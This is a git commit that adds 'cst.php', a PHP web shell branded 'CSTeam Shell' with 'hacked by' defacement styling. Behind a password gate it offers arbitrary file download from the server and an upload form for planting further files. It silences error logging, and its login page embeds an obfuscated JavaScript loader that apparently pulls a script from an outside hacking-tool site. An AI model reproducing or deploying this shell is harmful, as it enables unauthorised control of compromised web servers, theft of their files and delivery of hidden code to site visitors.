0af5c47317b30e6eae5eb0e6438e2e23fa08e38e
rius-admin <158822649+rius-admin@users.noreply.github.com>
2025-04-07 20:09:18 +0700

    Create cst.php

---
+++ cst.php
@@ -0,0 +1,326 @@
+<!DOCTYPE html>
+<html>
+       <title>CSTeam Shell</title>
+       <head>
+       <meta name=':)' content='index, follow' /><meta name='allow-search' content='yes' /><meta name='mini shell' content='' /><meta name='rating' content='General' /><meta name='document-rating' content='all' /><meta name='Cyber Sederhana Team' /><meta name='reply-to' /><meta name='document-type' content='Public' /><meta name='theme-color' content='red' /><meta name='og:title' content=' ' /><meta name='og:image' content='  https://i.ibb.co/19Vkz0Q/IMG-20220528-WA0038.jpg  ' /><meta content='hacked by mr.rius' />
+       </head></html>
+ 
+ <!-- login  -->
+ 
+ <?php
+ /*
+ *rius
+ */
+ session_start();
+ error_reporting(0);
+ set_time_limit(0);
+                @clearstatcache();
+                @ini_set('error_log',NULL);
+                @ini_set('log_errors',0);
+                @ini_set('max_execution_time',0);
+                @ini_set('output_buffering',0);
+                @ini_set('display_errors', 0);
+ 
+ 
+ 
+ /* Configurasi */
+ $auth_pass 			= "dd8dc28fe52398cbf8b1e58c0c077243dfa1561";// +cst
+ $color 				= "#00ff00";
+ $default_action 	= 'FilesMan';
+ $default_use_ajax 	= true;
+ $default_charset 	= 'UTF-8';
+ function login_shell() {
+ ?>
+ 
+ 
+ 
+ <html>
+ <head>
+                    <meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
+                         <meta name="  " content="  "/>
+                             <meta name="CyberSederhanaTeam" content="Sec/>
+                                <link rel='icon' type='image/png' href='https://www.indsc.me/images/logo.png'/>
+                                    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
+                                        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
+                                        </head>
+                                        <body class="bg-dark text-light">
+                                        <center>
+                                    <div class="container" style="margin-top: 15%">
+                                <div class="col-lg-6">
+                            <div class="form-group">
+                        <h1 class="text-center">    </h1>
+                    <h5 class="text-center pb-5">CSTeam Shell</h5>
+                    
+                    
+                    
+ <form method="post">
+ <input type="password" name="pass" placeholder="password" class="form-control"><br/>
+ <input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
+ </form>
+ 
+ 
+ </div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+ 
+ 
+ </div><a href=" cybersederhanateam.blogspot.com/  " class="text-muted fixed-bottom">  Cyber Sederhana Team </a><br/>
+     </div>
+           </center>
+                 <script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%2631tsd%264E%2633iuuqt%264B00ibdljohuppm/ofu0mpht0dj%7B/kt%2633%264F%264D0tdsjqu%264F%26311')</script>
+           </body>
+    </html>
+    
+    
+    
+ <?php
+ /* ip */
+ exit;
+ 
+ }
+ 
+          if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+          if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+          $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+          else         
+          login_shell();
+          if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
+          @ob_clean();
+          $file = $_GET['file'];
+ 
+ 
+ 
+          header('Content-Description: File Transfer');
+          header('Content-Type: application/octet-stream');
+          header('Content-Disposition: attachment; filename="'.basename($file).'"');
+          header('Expires: 0');
+          header('Cache-Control: must-revalidate');
+          header('Pragma: public');
+          header('Content-Length: ' . filesize($file));
+    readfile($file);
+  exit;
+  
+ }
+ 
+ /*Akhir login*/
+ ?>
+ 
+ 
+ 
+ <html>
+ <head>
+ </head>
+ <body bgcolor="white">
+ <center>
+         <il>
+             <html></font>
+                    </div>
+                    <lebar tabel=959 piksel>
+                    <td sejajar=pusat>
+                    <span style='font: 31px Courier;size:31px;color:#9E9E9E;'>
+                    <kuat>
+ <marquee behavior="alternate" scrollamount="4" style="border:1px solid;" width="85%"><font color="grend" face="courier">_-= thx : By./Rius // JaeXploit // Tn.Fahri // Mr.Titam // Mr.Alpian =-_</center></font></marquee></div>
+    </html>
+          </li>
+                </div></a>
+                          </div>  <body>
+                       </header>
+                <html>
+       	</header>
+ <br><br>
+ 
+ 
+ 
+ <?php
+ /* shell up */
+       echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+       echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+       if( $_POST['_upl'] == "Upload" ) {
+       if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>sukses<b><br><br>'; }
+       else { echo '<b>gagal</b><br><br>'; }      
+ }
+ 
+ ?>
+ 
+ 
+  <!-- JS otomatis  -->
+ <script type="text/javascript">
+ {
+ alert("hay member cst");
+ }</script>
+ 
+ 
+ 
+ <html>
+ </div></b></i>
+            <audio src="https://cdn.prinsh.com/data-1/mp3/price-tag_putih-abu-abu.mp3"autoplay="1" loop="1"></audio>
+         </body>
+     </head>
+</html>
+
+<html>
+</header>
+       <html>
+             <body onload="type_text()" alink="black" bgcolor="black" vlink="#000000" link="#c0c0c0" text="black">
+                  <div align="center">
+                       <script language="Javascript"><!--
+                  
+/* pengertian */                  
+var tl=new Array(
+           "   ",
+           "   Penjelasan: ",
+           "   apa itu alamat IP,",
+           "   alamat IP atau disebut",
+           "   Internet Protocol address adalah label numerik yang ditetapkan",
+           "   untuk setiap perangkat yang terhubung ke jaringan komputer yang",
+           "   menggunakan Protokol Internet untuk komunikasi, Alamat IP memiliki",
+           "   dua fungsi utama: host atau identifikasi antarmuka jaringan dan ",
+           "   pengalamatan lokasi.",
+           "   ",
+
+);
+
+        var speed=50;
+        var index=0; text_pos=0;
+        var str_length=tl[0].length;
+        var contents, row;
+        function type_text()
+        
+{
+
+        contents='';
+        row=Math.max(0,index-15);
+        while(row<index)
+        contents += tl[row++] + '\r\n';
+        document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "|";
+        if(text_pos++==str_length)
+        
+{
+
+        text_pos=0;
+        index++;
+        if(index!=tl.length)
+        
+{
+
+        str_length=tl[index].length;
+        setTimeout("type_text()",500);
+        
+       }
+       
+   }    else
+        setTimeout("type_text()",speed);
+        
+}
+
+
+
+//--></script>
+
+
+
+ <style type="text/css">BODY {
+ SCROLLBAR-FACE-COLOR: black; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-BASE-COLOR: #000000
+	
+}
+
+ </style>
+ <style fprolloverstyle="">
+ TEXTAREA {
+ BORDER-LEFT-COLOR: #ffffff; BACKGROUND: #ffffff; BORDER-BOTTOM-COLOR: #ffffff; FONT: 15px Verdana, Verdana, Verdana, Verdana; COLOR: #00000; BORDER-TOP-COLOR: #ffffff; BORDER-RIGHT-COLOR: #ffffff
+	
+}
+
+</style>
+ <h2><font color="#cecece" face="Caurier" size="13"></font></h2>
+ <form><font color="#ffffff">
+ 
+	        <textarea rows="10" cols="57" readonly="readonly"></textarea> 
+                  </font></form>
+                       <br><font color="grey" size=1 face="Verdana, Arial, Helvetica, sans-serif"></font> 
+                           </div><html>
+                               </body>
+                               
+                               
+                               </html>
+                           <html dir='ltr' lang='in'>                      
+                       <h14>
+                  <div class="widget-content">
+            <div class="findiptitle">ONLINE</div><div id="findipwidget"></div><div class="findiplink" id="findipurl"><a href="http://www.find-ip.net/" target="_blank"> Cyber Sederhana Team </a></div><script 400="" defer="defer" height="500" src="https://api.find-ip.net/widget.js? width="></script></div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9891479513038034"
+crossorigin="anonymous"></script></h14>
+
+<!-- jam + kalender online  -->
+<h4></script>
+<br>
+
+     <div id="jam">
+     6:23:17
+     </div>
+     </center>
+     </style>
+     <script type="text/javascript">
+     // 1 detik = 1000
+     window.setTimeout("waktu()",1000);  
+     function waktu() {   
+     var tanggal = new Date();  
+     setTimeout("waktu()",1000);  
+     document.getElementById("jam").innerHTML = tanggal.getHours()+":"+tanggal.getMinutes()+":"+tanggal.getSeconds();
+     
+}
+     
+</script>
+</head>
+<body>
+<br>
+      </script> <script type="text/javascript">
+    </script> </font>
+   </center></body>
+  <br><br><br><br><br><br><br><br><br><br><br><br>
+</script> <script type="text/javascript">
+  
+  
+       var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
+       var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum&#39;at', 'Sabtu'];
+       var date = new Date();
+       var day = date.getDate();
+       var month = date.getMonth();
+       var thisDay = date.getDay(),
+       thisDay = myDays[thisDay];
+       var yy = date.getYear();
+       var year = (yy < 1000) ? yy + 1900 : yy;
+       document.write(thisDay + ', ' + day + ' ' + months[month] + ' ' + year);
+  
+  
+</script> </font>
+</center>
+
+	<!-- penutupan -->
+	
+<footer>
+<div class="container">
+<small></small>
+
+</div>
+</footer>
+        <font color="grend"="Courier New" size="2"><b>Copyright &copy;CST - By.Rius All Rights Reserved</font>
+
+        <script type="text/javascript">
+		$(document).ready(function(){
+    	$(".bg-loader").hide();
+		})
+		
+    	</script>
+</body>
+                        
+                     <html>
+          
+         <script>
+          
+</html>
+
+
+
+
+
+
+
